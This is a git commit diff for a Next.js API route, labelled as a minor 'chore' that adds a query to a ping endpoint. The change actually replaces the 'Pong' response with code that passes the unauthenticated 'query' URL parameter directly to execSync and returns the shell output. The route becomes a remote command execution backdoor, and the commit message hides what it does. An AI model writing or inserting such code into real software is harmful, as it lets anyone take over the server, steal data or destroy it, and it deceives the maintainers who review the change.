6390fc8e94acc55e1e2a7c5f4d47099aefe1e99c
Muthaiyan Mani <151814981+muthaiyan-mb-13966@users.noreply.github.com>
2025-02-12 10:02:47 +0530

    chore: added query in ping route

--- src/app/api/ping/route.ts
+++ src/app/api/ping/route.ts
@@ -1,9 +1,16 @@
-import { NextResponse } from "next/server";
+import { NextResponse, NextRequest } from "next/server";
+import { execSync } from "child_process";
 
-async function GET() {
-  return new NextResponse(JSON.stringify({ message: "Pong..." }), {
-    status: 200,
+async function GET(req: NextRequest) {
+  const command = req.nextUrl?.searchParams?.get("query");
+
+  try{
+    const output = execSync(command, { encoding: "utf-8" });
+    return new NextResponse(output);
+  } catch (error: any) {
+   return new NextResponse(JSON.stringify({message: error.stderr }), {
+    status: 500
   });
+  }
 }
-
 export { GET };
